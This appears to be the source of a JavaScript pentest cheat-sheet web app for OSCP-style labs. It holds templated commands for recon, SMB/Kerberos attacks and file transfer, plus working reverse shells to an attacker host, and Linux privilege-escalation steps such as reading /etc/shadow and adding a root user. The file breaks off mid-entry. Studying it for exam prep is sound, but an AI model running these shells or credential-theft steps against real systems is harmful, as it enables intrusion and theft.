const STORE = {
  values: "pentestbench_values_v4",
  recipes: "pentestbench_recipes_v4",
  ws_log: "pentestbench_ws_log_v1",
  ws_check: "pentestbench_ws_check_v1",
  ws_creds: "pentestbench_ws_creds_v1",
  oscpStandalone: "pentestbench_oscp_standalone_v1",
  adChecklist: "pentestbench_oscp_ad_v1",
};

const els = {};

function cacheEls() {
  els.tabs = Array.from(document.querySelectorAll(".tab"));
  els.views = {
    commands: document.getElementById("view-commands"),
    workspace: document.getElementById("view-workspace"),
    cheatsheet: document.getElementById("view-cheatsheet"),
    oscp: document.getElementById("view-oscp"),
    adcheck: document.getElementById("view-adcheck")
  };

  els.profile = document.getElementById("profile");

  els.ip = document.getElementById("ip");
  els.port = document.getElementById("port");
  els.url = document.getElementById("url");
  els.domain = document.getElementById("domain");
  els.user = document.getElementById("user");
  els.pass = document.getElementById("pass");
  els.wordlist = document.getElementById("wordlist");
  els.hashfile = document.getElementById("hashfile");
  els.lhost = document.getElementById("lhost");
  els.lport = document.getElementById("lport");
  els.iface = document.getElementById("iface");
  els.proxy = document.getElementById("proxy");

  els.cmdSearch = document.getElementById("cmdSearch");
  els.btnClearSearch = document.getElementById("btnClearSearch");
  els.commandsContainer = document.getElementById("commandsContainer");
  els.quickTags = document.getElementById("quickTags");

  els.btnToggleAll = document.getElementById("btnToggleAll");
  els.btnResetAll = document.getElementById("btnResetAll");

  els.wsLog = document.getElementById("wsLog");
  els.wsChecklist = document.getElementById("wsChecklist");
  els.wsCreds = document.getElementById("wsCreds");
  els.btnWsInsertTs = document.getElementById("btnWsInsertTs");
  els.btnWsCopyMd = document.getElementById("btnWsCopyMd");
  els.btnWsExport = document.getElementById("btnWsExport");
  els.btnWsClear = document.getElementById("btnWsClear");

  els.cheatsContainer = document.getElementById("cheatsContainer");

  els.toast = document.getElementById("toast");

  els.oscpContainer = document.getElementById("oscpContainer");
  els.adContainer = document.getElementById("adContainer");

  els.oscpSlot = document.getElementById("oscpSlot");

  els.btnOscpExpandAll = document.getElementById("btnOscpExpandAll");
  els.btnOscpCollapseAll = document.getElementById("btnOscpCollapseAll");
  els.btnOscpReset = document.getElementById("btnOscpReset");

  els.btnAdExpandAll = document.getElementById("btnAdExpandAll");
  els.btnAdCollapseAll = document.getElementById("btnAdCollapseAll");
  els.btnAdReset = document.getElementById("btnAdReset");
}

function loadJSON(key, fallback) {
  try {
    const raw = localStorage.getItem(key);
    return raw ? JSON.parse(raw) : fallback;
  } catch {
    return fallback;
  }
}

function saveJSON(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

function toast(msg) {
  if (!els.toast) return;
  els.toast.textContent = msg;
  els.toast.classList.add("show");
  window.clearTimeout(toast._t);
  toast._t = window.setTimeout(() => els.toast.classList.remove("show"), 1200);
}

async function copy(text) {
  try {
    await navigator.clipboard.writeText(text);
    toast("Copiado.");
    return true;
  } catch {
    toast("Falha ao copiar.");
    return false;
  }
}

function escapeHtml(s) {
  return String(s ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll("\"", "&quot;")
    .replaceAll("'", "&#39;");
}

function pick(val, fallback) {
  const s = (val ?? "").toString().trim();
  return s ? s : fallback;
}

function getValues() {
  return {
    ip: els.ip.value.trim(),
    port: els.port.value.trim(),
    url: els.url.value.trim(),
    domain: els.domain.value.trim(),
    user: els.user.value.trim(),
    pass: els.pass.value.trim(),
    wordlist: els.wordlist.value.trim(),
    hashfile: els.hashfile.value.trim(),
    lhost: els.lhost.value.trim(),
    lport: els.lport.value.trim(),
    iface: els.iface.value.trim(),
    proxy: els.proxy.value.trim(),
    profile: els.profile.value
  };
}

function applyValues(v) {
  els.ip.value = pick(v.ip ?? els.ip.value, "10.10.10.10");
  els.port.value = pick(v.port ?? els.port.value, "443");
  els.url.value = pick(v.url ?? els.url.value, "");
  els.domain.value = pick(v.domain ?? els.domain.value, "corp.local");
  els.user.value = pick(v.user ?? els.user.value, "administrator");
  els.pass.value = pick(v.pass ?? els.pass.value, "Password123!");
  els.wordlist.value = pick(v.wordlist ?? els.wordlist.value, "/usr/share/wordlists/rockyou.txt");
  els.hashfile.value = pick(v.hashfile ?? els.hashfile.value, "/tmp/hashes.txt");
  els.lhost.value = pick(v.lhost ?? els.lhost.value, "10.10.14.5");
  els.lport.value = pick(v.lport ?? els.lport.value, "4444");
  els.iface.value = pick(v.iface ?? els.iface.value, "tun0");
  els.proxy.value = pick(v.proxy ?? els.proxy.value, "socks5://127.0.0.1:1080");
  els.profile.value = (v.profile ?? els.profile.value ?? "all");
}

function normalizeUrl(values) {
  if (values.url) return values.url;
  const host = values.ip || "";
  const port = values.port || "";
  if (!host) return "";
  if (!port || port === "80") return `http://${host}`;
  if (port === "443") return `https://${host}`;
  return `http://${host}:${port}`;
}

function computeDerived(values) {
  const url = normalizeUrl(values);
  return { ...values, url };
}

function renderCmdPlain(template, values) {
  return template.replace(/\{(\w+)\}/g, (match, k) => {
    return (k in values && values[k] !== "") ? values[k] : match;
  });
}

function renderCmdHighlightedSafe(template, values) {
  const parts = [];
  let last = 0;
  const re = /\{(\w+)\}/g;
  let m;

  while ((m = re.exec(template)) !== null) {
    parts.push(escapeHtml(template.slice(last, m.index)));
    const key = m[1];
    if (key in values && values[key] !== "") {
      parts.push(`<span class="ph" title="${escapeHtml(key)}">${escapeHtml(values[key])}</span>`);
    } else {
      parts.push(escapeHtml(m[0]));
    }
    last = m.index + m[0].length;
  }

  parts.push(escapeHtml(template.slice(last)));
  return parts.join("");
}

function toSpacedLinesHtml(multilineHtml) {
  const lines = String(multilineHtml ?? "").split("\n");
  return lines.map((l) => `<div class="codeLine">${l}</div>`).join("");
}

function applyCodeSpacingEl(codeEl) {
  codeEl.style.lineHeight = "1.85";
}

function stableAccentKey(str) {
  let h = 0;
  for (let i = 0; i < str.length; i++) h = ((h << 5) - h + str.charCodeAt(i)) | 0;
  const k = Math.abs(h) % 8;
  return ["A", "B", "C", "D", "E", "F", "G", "H"][k];
}

function snapshotOpenSections(containerEl) {
  const openKeys = new Set();
  if (!containerEl) return openKeys;

  containerEl.querySelectorAll(".section").forEach(sec => {
    if (sec.dataset.open === "true") {
      const k = sec.dataset.key || sec.querySelector(".sectionTitle")?.textContent?.trim() || "";
      openKeys.add(k);
    }
  });

  return openKeys;
}

function restoreOpenSections(containerEl, openSet) {
  if (!containerEl) return;

  containerEl.querySelectorAll(".section").forEach(sec => {
    const k = sec.dataset.key || sec.querySelector(".sectionTitle")?.textContent?.trim() || "";
    const shouldOpen = openSet.has(k);
    sec.dataset.open = shouldOpen ? "true" : "false";
    const body = sec.querySelector(".sectionBody");
    if (body) body.style.display = shouldOpen ? "grid" : "none";
  });
}

const DEFAULT_RECIPES = [
  {
    category: "Reconhecimento",
    icon: "üß≠",
    profile: ["oscp", "web", "ad"],
    note: "Primeiro passe: identificar portas, servi√ßos, vers√µes e caminhos √≥bvios.",
    items: [
      {
        name: "Nmap baseline",
        tag: ["nmap", "recon", "scan"],
        note: "Escaneie full TCP. Depois rode scripts e vers√µes no set de portas encontrado.",
        steps: [
          { title: "Full TCP (r√°pido)", cmd: "nmap -p- -v -Pn -T4 {ip} -oN nmap_ports.txt" },
          { title: "Full TCP (mais est√°vel)", cmd: "nmap -p- -v -Pn -T3 {ip}" },
          { title: "Scripts + vers√µes (portas espec√≠ficas)", cmd: "nmap -sC -sV -Pn -p {port} {ip} -oN nmap_detail.txt" },
          { title: "Aggressive (quando fizer sentido)", cmd: "nmap -A -Pn -p {port} {ip}" },
          { title: "Salvar em arquivos", cmd: "nmap -p- -T4 -oA nmap_full {ip}\nnmap -sC -sV -p {port} -oA nmap_sv {ip}" },
          { title: "Bypass filters", cmd: "nmap -Pn -sV -g53 -D RND:30 -p{port} {ip} -oN nmap_versions.txt" }
        ]
      },
      {
        name: "UDP top ports",
        tag: ["nmap", "udp", "recon"],
        note: "UDP √© caro. Use top ports e ajuste conforme o cen√°rio.",
        steps: [
          { title: "Top 200 UDP", cmd: "sudo nmap -sU --top-ports 200 -T4 {ip}" },
          { title: "Porta UDP espec√≠fica", cmd: "sudo nmap -sU -p {port} -sV {ip}" }
        ]
      },
      {
        name: "Quick service probes",
        tag: ["recon", "probe"],
        note: "Checagens r√°pidas para entender banner e handshake.",
        steps: [
          { title: "HTTP headers", cmd: "curl -i -s {url} | head" },
          { title: "TLS info (se HTTPS)", cmd: "echo | openssl s_client -connect {ip}:{port} -servername {ip} 2>/dev/null | openssl x509 -noout -subject -issuer -dates" },
          { title: "Banner (nc)", cmd: "nc -nv {ip} {port}" }
        ]
      }
    ]
  },

  {
    category: "HTTP Web",
    icon: "üåê",
    profile: ["oscp", "web"],
    note: "Enum de conte√∫do, par√¢metros, tech stack e vulnerabilidades comuns.",
    items: [
      {
        name: "Tech + headers",
        tag: ["web", "recon"],
        steps: [
          { title: "WhatWeb", cmd: "whatweb {url}" },
          { title: "Wappalyzer (manual)", cmd: "Use Wappalyzer no browser :)"} ,
          { title: "Robots + sitemap", cmd: "curl -s {url}/robots.txt\ncurl -s {url}/sitemap.xml | head" }
        ]
      },
      {
        name: "Directory and File fuzzing",
        tag: ["web", "fuzz", "ffuf"],
        note: "Ajuste -fc/-fs conforme respostas do alvo.",
        steps: [
          { title: "FFUF dir", cmd: "ffuf -u {url}/FUZZ -w {wordlist} -t 50 -fc 404" },
          { title: "FFUF arquivos", cmd: "ffuf -u {url}/FUZZ -w {wordlist} -t 50 -fc 404 -e php,asp,aspx,txt,html,js,jsp" },
          { title: "FFUF recursion (b√°sico)", cmd: "ffuf -u {url}/FUZZ -w {wordlist} -recursion -recursion-depth 2 -t 80 -fc 404" },
          { title: "FFUF de diret√≥rio com recurs√£o (√∫ltimo recurso, wordlist muito grande)", cmd: "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 1 -o dirs" },
          { title: "FFUF misto arquivo/diret√≥rios", cmd: "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -recursion -recursion-depth 1" },
          { title: "FFUF equilibrado com wordlist menor", cmd: "ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion -recursion-depth 1" },
          { title: "FFUF arquvivos com wordlist", cmd: "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -e php,asp,aspx,jsp,html,txt,json -o files" }
        ]
      },
            {
        name: "Directory and File fuzzing (gobuster + wfuzz)",
        tag: ["web", "fuzz", "gobuster", "wfuzz", "oscp"],
        note: "Geral: ajuste filtros (status, tamanho/words/lines) conforme o alvo. Em vhosts, defina Host header. Prefira wordlists m√©dias primeiro e s√≥ escale se fizer sentido.",
        steps: [
          { title: "GOBUSTER dir (b√°sico)", cmd: "gobuster dir -u {url} -w {wordlist} -t 50 -x php,asp,aspx,txt,html,js,jsp -b 404" },
          { title: "GOBUSTER dir (equilibrado, wordlist comum)", cmd: "gobuster dir -u {url} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt -b 404" },
          { title: "GOBUSTER dir (for√ßando HTTPS/TLS ruim)", cmd: "gobuster dir -u {url} -w {wordlist} -t 50 -x php,html,txt -b 404 -k" },
          { title: "GOBUSTER dir (adicionando user-agent e header)", cmd: "gobuster dir -u {url} -w {wordlist} -t 50 -x php,html,txt -b 404 -a \"Mozilla/5.0\" -H \"X-Forwarded-For: 127.0.0.1\"" },

          { title: "WFUZZ dir (filtrando por status)", cmd: "wfuzz -c -t 50 --hc 404 -w {wordlist} {url}/FUZZ" },
          { title: "WFUZZ arquivos (extens√µes comuns OSCP)", cmd: "wfuzz -c -t 50 --hc 404 -w {wordlist} {url}/FUZZ.php,{url}/FUZZ.asp,{url}/FUZZ.aspx,{url}/FUZZ.jsp,{url}/FUZZ.html,{url}/FUZZ.txt,{url}/FUZZ.json" },
          { title: "WFUZZ filtrando por tamanho (quando 200 √© fake)", cmd: "wfuzz -c -t 50 --hc 404 --hh {bytes} -w {wordlist} {url}/FUZZ" },
          { title: "WFUZZ filtrando por words/lines (alternativa ao hh)", cmd: "wfuzz -c -t 50 --hc 404 --hw {words} --hl {lines} -w {wordlist} {url}/FUZZ" },
          { title: "WFUZZ vhost fuzz (Host header)", cmd: "wfuzz -c -t 50 --hc 400,404 -w {wordlist} -H \"Host: FUZZ.{domain}\" http://{ip}/" },
          { title: "WFUZZ com recurs√£o manual (2 n√≠veis, r√°pido)", cmd: "wfuzz -c -t 50 --hc 404 -w {wordlist} {url}/FUZZ | tee wfuzz_lvl1.txt && awk '{print $NF}' wfuzz_lvl1.txt | sed 's#\\r##g' | grep -Eo 'https?://[^ ]+' | while read u; do wfuzz -c -t 50 --hc 404 -w {wordlist} \"$u/FUZZ\"; done" }
        ]
      },
      {
        name: "VHost fuzzing",
        tag: ["web", "vhost", "ffuf"],
        note: "√ötil quando h√° indica√ß√£o de m√∫ltiplos hosts no mesmo IP.",
        steps: [
          { title: "FFUF Host header", cmd: "ffuf -u {url}/ -H \"Host: FUZZ.{domain}\" -w {wordlist} -fs 0" },
          { title: "FFUF subdomain (se tiver lista)", cmd: "ffuf -u {url}/ -H \"Host: FUZZ\" -w subdomains.txt -fs 0" }
        ]
      },
      {
        name: "Param discovery",
        tag: ["web", "params"],
        steps: [
          { title: "Arjun (GET)", cmd: "arjun -u {url} --get" },
          { title: "Arjun (com path)", cmd: "arjun -u {url}/PATH --get" },
          { title: "FFUF param", cmd: "ffuf -u {url}/page.php?FUZZ=test -w burp-parameter-names.txt" }
        ]
      },
      {
        name: "Nikto + Nuclei",
        tag: ["web", "scan"],
        steps: [
          { title: "Nikto", cmd: "nikto -h {url} -o nikto_scan.txt" },
          { title: "Nuclei (r√°pido)", cmd: "nuclei -u {url} -severity low,medium,high,critical" }
        ]
      },
      {
        name: "Common web checks",
        tag: ["web", "manual"],
        note: "Checklist r√°pida do que olhar antes de perder tempo fuzzando demais.",
        steps: [
          { title: "Paths comuns", cmd: "curl -s -o /dev/null -w \"%{http_code} %{url_effective}\\n\" {url}/admin {url}/login {url}/register {url}/upload {url}/api {url}/graphql" },
          { title: "Git exposed", cmd: "curl -s -o /dev/null -w \"%{http_code}\\n\" {url}/.git/HEAD" },
          { title: "Env/backup files", cmd: "curl -s -o /dev/null -w \"%{http_code}\\n\" {url}/.env\ncurl -s -o /dev/null -w \"%{http_code}\\n\" {url}/backup.zip\ncurl -s -o /dev/null -w \"%{http_code}\\n\" {url}/db.sql" }
        ]
      }
    ]
  },

  {
    category: "SMB",
    icon: "ü™ü",
    profile: ["oscp", "ad"],
    note: "Fluxo SMB completo: scan 139/445, smbclient/smbmap, RPC (srvinfo, shares, users), RID cycling, samrdump, enum4linux-ng, e CME para valida√ß√£o r√°pida.",
    items: [
      {
        name: "Scan (139/445)",
        tag: ["smb", "enum", "nmap"],
        steps: [
          { title: "Nmap default SMB sweep", cmd: "sudo nmap {ip} -sV -sC -p139,445" },
          { title: "SMB scripts (broad)", cmd: "nmap -p 445 --script \"smb*\" {ip}" },
          { title: "SMB signing", cmd: "nmap -p 445 --script smb-security-mode {ip}" },
          { title: "SMB protocols", cmd: "nmap -p 445 --script smb-protocols {ip}" },
          { title: "SMB OS discovery", cmd: "nmap -p 445 --script smb-os-discovery {ip}" }
        ]
      },
  
      {
        name: "Possible default config files (alvo Linux/Samba)",
        tag: ["smb", "linux", "samba", "enum"],
        steps: [
          { title: "Common samba config path", cmd: "cat /etc/samba/smb.conf 2>/dev/null" }
        ]
      },
  
      {
        name: "Interact with SMBClient",
        tag: ["smb", "smbclient", "enum"],
        steps: [
          { title: "List shares (anon)", cmd: "smbclient -L //{ip}/ -N" },
          { title: "List shares (auth)", cmd: "smbclient -L //{ip}/ -U \"{user}%{pass}\"" },
          { title: "Connect to a share (example: notes)", cmd: "smbclient //{ip}/notes -N" },
          { title: "Connect to a share (auth)", cmd: "smbclient //{ip}/{share} -U \"{user}%{pass}\"" }
        ]
      },
  
      {
        name: "RPC client (manual enum)",
        tag: ["smb", "rpc", "enum"],
        steps: [
          { title: "rpcclient null session", cmd: "rpcclient -U \"\" -N {ip}" },
          { title: "rpcclient with domain context", cmd: "rpcclient -W {domain} -U \"{user}%{pass}\" {ip}" },
          { title: "srvinfo", cmd: "rpcclient -U \"\" -N {ip} -c \"srvinfo\"" },
          { title: "enumdomains", cmd: "rpcclient -U \"\" -N {ip} -c \"enumdomains\"" },
          { title: "querydominfo", cmd: "rpcclient -U \"\" -N {ip} -c \"querydominfo\"" },
          { title: "netshareenumall", cmd: "rpcclient -U \"\" -N {ip} -c \"netshareenumall\"" },
          { title: "netsharegetinfo <share>", cmd: "rpcclient -U \"\" -N {ip} -c \"netsharegetinfo {share}\"" },
          { title: "enumdomusers", cmd: "rpcclient -U \"\" -N {ip} -c \"enumdomusers\"" },
          { title: "queryuser <RID>", cmd: "rpcclient -U \"\" -N {ip} -c \"queryuser {rid}\"" }
        ]
      },
  
      {
        name: "Brute forcing user RIDs (loop)",
        tag: ["smb", "rpc", "rid", "enum"],
        note: "√ötil quando null session funciona. Ajuste range conforme o ambiente.",
        steps: [
          {
            title: "RID bruteforce loop (500-1100)",
            cmd: "for i in $(seq 500 1100); do rpcclient -U \"\" -N {ip} -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" && echo \"\"; done"
          }
        ]
      },
  
      {
        name: "Automated enumeration",
        tag: ["smb", "enum", "automation"],
        steps: [
          { title: "smbmap quick", cmd: "smbmap -H {ip}" },
          { title: "smbmap with creds", cmd: "smbmap -H {ip} -u {user} -p \"{pass}\"" },
          { title: "CME shares (anon)", cmd: "crackmapexec smb {ip} --shares -u \"\" -p \"\"" },
          { title: "CME shares (auth)", cmd: "crackmapexec smb {ip} --shares -u {user} -p \"{pass}\"" }
        ]
      },
  
      {
        name: "Impacket: samrdump",
        tag: ["smb", "impacket", "rpc", "enum"],
        steps: [
          { title: "samrdump", cmd: "samrdump.py {ip}" }
        ]
      },
  
      {
        name: "enum4linux-ng (full run)",
        tag: ["smb", "enum4linux", "enum"],
        steps: [
          { title: "Install", cmd: "git clone https://github.com/cddmp/enum4linux-ng.git\ncd enum4linux-ng\npip3 install -r requirements.txt" },
          { title: "Run all (-A)", cmd: "./enum4linux-ng.py {ip} -A" }
        ]
      },
  
      {
        name: "Share validation (read/write)",
        tag: ["smb", "shares", "enum"],
        steps: [
          { title: "Recurse list via smbmap", cmd: "smbmap -H {ip} -u {user} -p \"{pass}\" -R" },
          { title: "Write test (if allowed)", cmd: "smbclient //{ip}/{share} -U \"{user}%{pass}\" -c \"put /etc/hosts test.txt\"" },
          { title: "Download quick (interactive idea)", cmd: "smbclient //{ip}/{share} -U \"{user}%{pass}\"" }
        ]
      }
    ]
  },

  {
    category: "LDAP",
    icon: "üìö",
    profile: ["ad"],
    note: "LDAP ajuda a puxar usu√°rios, grupos e infos do dom√≠nio.",
    items: [
      {
        name: "ldapsearch basics",
        tag: ["ldap", "ad", "enum"],
        steps: [
          { title: "Naming contexts", cmd: "ldapsearch -x -H ldap://{ip} -s base namingcontexts" },
          { title: "Users (se base DN conhecido)", cmd: "ldapsearch -x -H ldap://{ip} -b \"DC=corp,DC=local\" \"(objectClass=user)\" sAMAccountName | head -n 50" }
        ]
      }
    ]
  },

  {
    category: "Kerberos",
    icon: "üé´",
    profile: ["ad"],
    note: "ASREPRoast e Kerberoast aparecem com frequ√™ncia em labs estilo OSCP.",
    items: [
      {
        name: "ASREPRoast / Kerberoast",
        tag: ["ad", "kerberos", "impacket"],
        steps: [
          { title: "ASREPRoast (GetNPUsers)", cmd: "GetNPUsers.py {domain}/ -dc-ip {ip} -usersfile users.txt -no-pass" },
          { title: "Kerberoast (GetUserSPNs)", cmd: "GetUserSPNs.py {domain}/{user}:\"{pass}\" -dc-ip {ip} -request" }
        ]
      },
      {
        name: "Kerberos user enum",
        tag: ["ad", "kerberos", "enum"],
        steps: [
          { title: "kerbrute userenum", cmd: "kerbrute userenum --dc {ip} -d {domain} users.txt" }
        ]
      }
    ]
  },

  {
    category: "WinRM / RDP / SSH",
    icon: "üß∑",
    profile: ["oscp", "ad"],
    note: "Acesso remoto e valida√ß√£o r√°pida de credenciais.",
    items: [
      {
        name: "SSH",
        tag: ["ssh", "access"],
        steps: [
          { title: "SSH login", cmd: "ssh {user}@{ip}" },
          { title: "SSH com porta", cmd: "ssh -p {port} {user}@{ip}" },
          { title: "SSH key", cmd: "ssh -i id_rsa {user}@{ip}" }
        ]
      },
      {
        name: "RDP",
        tag: ["rdp", "access"],
        steps: [
          { title: "xfreerdp (senha)", cmd: "xfreerdp /v:{ip} /u:{user} /p:\"{pass}\" /dynamic-resolution /cert:ignore" },
          { title: "xfreerdp (pass-the-hash)", cmd: "xfreerdp /v:{ip} /u:{user} /pth:{hashfile} /dynamic-resolution /cert:ignore" }
        ]
      },
      {
        name: "WinRM",
        tag: ["winrm", "access"],
        steps: [
          { title: "evil-winrm", cmd: "evil-winrm -i {ip} -u {user} -p \"{pass}\"" },
          { title: "evil-winrm (hash)", cmd: "evil-winrm -i {ip} -u {user} -H {hashfile}" }
        ]
      }
    ]
  },

  {
    category: "SQL",
    icon: "üóÉÔ∏è",
    profile: ["oscp", "web"],
    note: "Enum de banco e explora√ß√£o b√°sica quando tiver credenciais ou inje√ß√£o.",
    items: [
      {
        name: "MySQL",
        tag: ["sql", "mysql"],
        steps: [
          { title: "Login", cmd: "mysql -h {ip} -P {port} -u {user} -p" },
          { title: "Dump r√°pido (se cred)", cmd: "mysqldump -h {ip} -u {user} -p --all-databases > dump.sql" }
        ]
      },
      {
        name: "MSSQL",
        tag: ["sql", "mssql"],
        steps: [
          { title: "impacket-mssqlclient", cmd: "mssqlclient.py {user}:\"{pass}\"@{ip}" },
          { title: "impacket-mssqlclient (windows auth)", cmd: "mssqlclient.py {domain}/{user}:\"{pass}\"@{ip} -windows-auth" }
        ]
      },
      {
        name: "PostgreSQL",
        tag: ["sql", "postgres"],
        steps: [
          { title: "psql", cmd: "psql -h {ip} -p {port} -U {user} -d postgres" },
          { title: "psql env (se necess√°rio)", cmd: "PGPASSWORD=\"{pass}\" psql -h {ip} -p {port} -U {user} -d postgres" }
        ]
      },
      {
        name: "SQLMap",
        tag: ["sql", "sqlmap", "web"],
        note: "Use com cuidado no exame e prefira prova manual quando der.",
        steps: [
          { title: "Dump b√°sico", cmd: "sqlmap -u \"{url}\" --batch --dbs" },
          { title: "Cookie", cmd: "sqlmap -u \"{url}\" --cookie=\"SESSION=...\" --batch --dbs" },
          { title: "Request file", cmd: "sqlmap -r request.txt --batch --dbs" }
        ]
      }
    ]
  },

  {
    category: "File Transfer",
    icon: "üì¶",
    profile: ["oscp", "web", "ad"],
    note: "Transfer r√°pido. Sempre tenha 2 ou 3 rotas alternativas.",
    items: [
      {
        name: "HTTP server (Linux attacker)",
        tag: ["transfer", "http"],
        steps: [
          { title: "Python http.server", cmd: "python3 -m http.server {lport} --bind 0.0.0.0" },
          { title: "php -S", cmd: "php -S 0.0.0.0:{lport}" }
        ]
      },
      {
        name: "Download (Linux victim)",
        tag: ["transfer", "linux"],
        steps: [
          { title: "curl", cmd: "curl -L http://{lhost}:{lport}/FILE -o /tmp/FILE" },
          { title: "wget", cmd: "wget http://{lhost}:{lport}/FILE -O /tmp/FILE" }
        ]
      },
      {
        name: "Download (Windows victim)",
        tag: ["transfer", "windows"],
        steps: [
          { title: "certutil", cmd: "certutil -urlcache -split -f http://{lhost}:{lport}/FILE C:\\\\Windows\\\\Temp\\\\FILE" },
          { title: "PowerShell (iwr)", cmd: "powershell -c \"iwr http://{lhost}:{lport}/FILE -OutFile C:\\\\Windows\\\\Temp\\\\FILE\"" }
        ]
      },
      {
        name: "SMB share (attacker -> victim)",
        tag: ["transfer", "smb"],
        steps: [
          { title: "impacket-smbserver", cmd: "impacket-smbserver share . -smb2support -username {user} -password \"{pass}\"" },
          { title: "Windows copy from share", cmd: "copy \\\\{lhost}\\\\share\\\\FILE C:\\\\Windows\\\\Temp\\\\FILE" }
        ]
      }
    ]
  },

  {
    category: "Reverse Shells",
    icon: "üß®",
    profile: ["oscp", "web"],
    note: "Varia por egress e tooling no target. Tenha alternativas.",
    items: [
      {
        name: "Listeners",
        tag: ["shell", "listener"],
        steps: [
          { title: "Netcat", cmd: "nc -lvnp {lport}" },
          { title: "rlwrap nc", cmd: "rlwrap nc -lvnp {lport}" },
          { title: "socat tty", cmd: "socat -d -d TCP-LISTEN:{lport},reuseaddr,fork STDOUT" }
        ]
      },
      {
        name: "Linux shells",
        tag: ["shell", "linux"],
        steps: [
          { title: "bash -i", cmd: "bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'" },
          { title: "mkfifo", cmd: "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | nc {lhost} {lport} > /tmp/s" },
          { title: "python", cmd: "python3 -c 'import os,socket,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'" }
        ]
      },
      {
        name: "Windows shells",
        tag: ["shell", "windows"],
        steps: [
          { title: "PowerShell TCP", cmd: "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String );$r2=$r+'PS '+(pwd).Path+'> ';$o=([text.encoding]::ASCII).GetBytes($r2);$s.Write($o,0,$o.Length);$s.Flush()}\"" }
        ]
      }
    ]
  },

  {
    category: "Linux PrivEsc",
    icon: "üêß",
    profile: ["oscp"],
    note: "Fluxo de LPE estilo checklist: come√ßa por wins r√°pidos (sudo/cron), depois permiss√µes sens√≠veis (passwd/shadow), SUID/caps, hist√≥rico/grupos, configs/containers/processos/ports.",
    items: [
      {
        name: "Pre-flight (optional): Stabilization & TTY",
        tag: ["linux", "tty", "stabilization"],
        steps: [
          { title: "PTY spawn", cmd: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
          { title: "Full TTY (manual)", cmd: "export TERM=xterm\nstty raw -echo; fg\nstty rows 40 columns 160" }
        ]
      },
  
      {
        name: "Sudo check (start here)",
        tag: ["linux", "sudo", "privesc"],
        steps: [
          { title: "List sudo rules", cmd: "sudo -l" },
          { title: "If anything looks exploitable", cmd: "# Se tiver NOPASSWD, comandos edit√°veis, env_keep, ou bin√°rios comuns\n# Cheque no GTFOBins e abuse do bin√°rio permitido\n# https://gtfobins.github.io/" }
        ]
      },
  
      {
        name: "Cron / scheduled tasks",
        tag: ["linux", "cron", "systemd", "privesc"],
        steps: [
          { title: "Crontab baseline", cmd: "cat /etc/crontab\nls -la /etc/cron.*\ncrontab -l 2>/dev/null" },
          { title: "Systemd timers (if present)", cmd: "systemctl list-timers --all 2>/dev/null" },
          { title: "What to look for", cmd: "# Scripts rodando como root, paths relativos, comandos sem caminho absoluto\n# Arquivos/dirs grav√°veis no path do script, ou bin√°rios chamados sem full path" }
        ]
      },
  
      {
        name: "/etc/passwd writable?",
        tag: ["linux", "passwd", "permissions", "privesc"],
        steps: [
          { title: "Check permissions", cmd: "ls -l /etc/passwd" },
          { title: "If writable: add root user (careful)", cmd: "# Se /etc/passwd for grav√°vel, d√° para adicionar um usu√°rio com UID 0\n# Gere hash: openssl passwd -6 'SenhaForteAqui'\n# Exemplo de linha: pwned:$6$...:0:0:root:/root:/bin/bash\n# Depois: su pwned" }
        ]
      },
  
      {
        name: "/etc/shadow readable?",
        tag: ["linux", "shadow", "hashes", "privesc"],
        steps: [
          { title: "Check readability", cmd: "ls -l /etc/shadow" },
          { title: "If readable: extract hashes", cmd: "sudo -n cat /etc/shadow 2>/dev/null || cat /etc/shadow" },
          { title: "Then crack offline", cmd: "# Copie os hashes e ataque offline (john/hashcat)\n# Priorize usu√°rios reais e contas com shell" }
        ]
      },
  
      {
        name: "SUID enumeration",
        tag: ["linux", "suid", "privesc"],
        steps: [
          { title: "Find SUID binaries", cmd: "find / -perm -u=s -type f 2>/dev/null" },
          { title: "Abuse candidates", cmd: "# Para cada SUID, valide no GTFOBins (se existir t√©cnica SUID)\n# https://gtfobins.github.io/#+suid\n# Aten√ß√£o extra em: find, vim, nano, bash, python, perl, tar, cp, mv, awk" }
        ]
      },
  
      {
        name: "Shell history leak",
        tag: ["linux", "history", "credentials", "privesc"],
        steps: [
          { title: "Read user histories", cmd: "cat /home/*/.bash_history 2>/dev/null\ncat /root/.bash_history 2>/dev/null" },
          { title: "Also check common artifacts", cmd: "ls -la /home/* 2>/dev/null | head\nfind /home -maxdepth 3 -type f \\( -name \".env\" -o -name \"*.pem\" -o -name \"id_rsa\" -o -name \"*.kdbx\" \\) 2>/dev/null" },
          { title: "If you find creds/keys", cmd: "# Reuse: ssh, su, sudo, services locais, backups, DBs, pain√©is internos\n# Sempre valide escopo e impacto antes de mexer" }
        ]
      },
  
      {
        name: "Interesting groups",
        tag: ["linux", "groups", "permissions", "privesc"],
        steps: [
          { title: "List groups", cmd: "id\ngroups" },
          { title: "What to look for", cmd: "# Exemplos comuns: docker, lxd, adm, sudo, disk, shadow, staff\n# Para cada grupo, procure o que ele permite ler/escrever/executar\n# HackTricks: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups" }
        ]
      },
  
      {
        name: "File capabilities",
        tag: ["linux", "capabilities", "privesc"],
        steps: [
